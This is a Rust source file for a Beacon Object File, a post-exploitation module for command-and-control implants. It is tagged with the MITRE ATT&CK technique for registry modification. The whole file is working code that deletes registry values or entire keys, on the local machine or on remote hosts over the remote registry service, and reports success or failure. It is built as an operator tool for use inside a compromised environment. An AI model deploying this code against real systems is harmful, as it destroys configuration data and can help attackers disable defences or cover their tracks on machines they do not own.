//! # Registry Delete BOF
//!
//! Deletes a registry value or key. If a value name is provided, deletes just
//! that value using RegDeleteValueA. If the value name is empty, deletes the
//! entire key using RegDeleteKeyA. Supports remote registry access via
//! RegConnectRegistryA when a hostname is provided.
//!
//! ## MITRE ATT&CK
//! - T1112 - Modify Registry
//!
//! ## Arguments
//! - `str`: Hostname (empty for localhost).
//! - `int`: Hive ID (0=HKCR, 1=HKCU, 2=HKLM, 3=HKU).
//! - `str`: Registry path (subkey).
//! - `str`: Value name (empty to delete the entire key).

#![no_std]

use alloc::string::String;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::System::Registry::*;

const HKEY_CLASSES_ROOT: isize = 0x80000000u32 as isize;
const HKEY_CURRENT_USER: isize = 0x80000001u32 as isize;
const HKEY_LOCAL_MACHINE: isize = 0x80000002u32 as isize;
const HKEY_USERS: isize = 0x80000003u32 as isize;

fn hive_from_id(id: i32) -> Option<isize> {
    match id {
        0 => Some(HKEY_CLASSES_ROOT),
        1 => Some(HKEY_CURRENT_USER),
        2 => Some(HKEY_LOCAL_MACHINE),
        3 => Some(HKEY_USERS),
        _ => None,
    }
}

fn hive_name(id: i32) -> &'static str {
    match id {
        0 => "HKEY_CLASSES_ROOT",
        1 => "HKEY_CURRENT_USER",
        2 => "HKEY_LOCAL_MACHINE",
        3 => "HKEY_USERS",
        _ => "UNKNOWN",
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let hostname = String::from(parser.get_str());
    let hive_id = parser.get_int();
    let path = String::from(parser.get_str());
    let key_name = String::from(parser.get_str());

    let hive = match hive_from_id(hive_id) {
        Some(h) => h,
        None => {
            eprintln!(
                "Invalid hive ID: {} (use 0=HKCR, 1=HKCU, 2=HKLM, 3=HKU)",
                hive_id
            );
            return;
        }
    };

    if path.is_empty() {
        eprintln!("Registry path is required");
        return;
    }

    let path_cstr = rustbof::str::to_cstr(&path);

    unsafe {
        let root_key: isize = if hostname.is_empty() {
            hive
        } else {
            let host_cstr = rustbof::str::to_cstr(&hostname);
            let mut remote_key: isize = 0;
            let ret = RegConnectRegistryA(
                host_cstr.as_ptr() as *const u8,
                hive as HKEY,
                &mut remote_key as *mut isize as *mut HKEY,
            );
            if ret != 0 {
                eprintln!("RegConnectRegistryA failed: 0x{:X}", ret);
                return;
            }
            remote_key
        };

        if key_name.is_empty() {
            let ret = RegDeleteKeyA(root_key as HKEY, path_cstr.as_ptr() as *const u8);
            if ret != 0 {
                eprintln!(
                    "RegDeleteKeyA failed on {}\\{}: 0x{:X}",
                    hive_name(hive_id),
                    path,
                    ret
                );
            } else {
                println!("SUCCESS: Deleted key {}\\{}", hive_name(hive_id), path);
            }
        } else {
            let mut hkey: isize = 0;
            let ret = RegOpenKeyExA(
                root_key as HKEY,
                path_cstr.as_ptr() as *const u8,
                0,
                KEY_SET_VALUE,
                &mut hkey as *mut isize as *mut HKEY,
            );
            if ret != 0 {
                eprintln!(
                    "RegOpenKeyExA failed on {}\\{}: 0x{:X}",
                    hive_name(hive_id),
                    path,
                    ret
                );
                if !hostname.is_empty() {
                    RegCloseKey(root_key as HKEY);
                }
                return;
            }

            let name_cstr = rustbof::str::to_cstr(&key_name);
            let ret = RegDeleteValueA(hkey as HKEY, name_cstr.as_ptr() as *const u8);
            if ret != 0 {
                eprintln!(
                    "RegDeleteValueA failed for '{}' on {}\\{}: 0x{:X}",
                    key_name,
                    hive_name(hive_id),
                    path,
                    ret
                );
            } else {
                println!(
                    "SUCCESS: Deleted value '{}' from {}\\{}",
                    key_name,
                    hive_name(hive_id),
                    path
                );
            }

            RegCloseKey(hkey as HKEY);
        }

        if !hostname.is_empty() {
            RegCloseKey(root_key as HKEY);
        }
    }
}
